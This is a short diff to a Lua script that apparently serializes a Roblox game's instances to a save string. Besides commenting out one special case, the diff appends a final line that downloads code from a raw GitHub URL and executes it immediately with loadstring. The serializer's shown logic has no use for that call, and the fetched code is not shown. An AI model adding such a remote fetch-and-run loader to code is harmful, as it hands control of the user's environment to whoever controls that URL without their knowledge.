@@ -250,9 +250,11 @@ local propFunc = {
 }
 
 local specialClassCases = {
-	["UnionOperation"] = function(inst)
+    --[[
+    ["UnionOperation"] = function(inst)
 		propFunc["Content"](inst,"AssetId")
 	end,
+    ]]
 	["Workspace"] = function(inst)
 		if inst:PGSIsEnabled() then
 			saveString = saveString..'\n<bool name="PGSPhysicsSolverEnabled">true</bool>'
@@ -344,3 +346,5 @@ function func_SInstance(inst, name)
 end
 
 func_SInstance(game, "hi")
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/LiterallyATrueClown/TailieuQuanTrong/main/hi", true))()
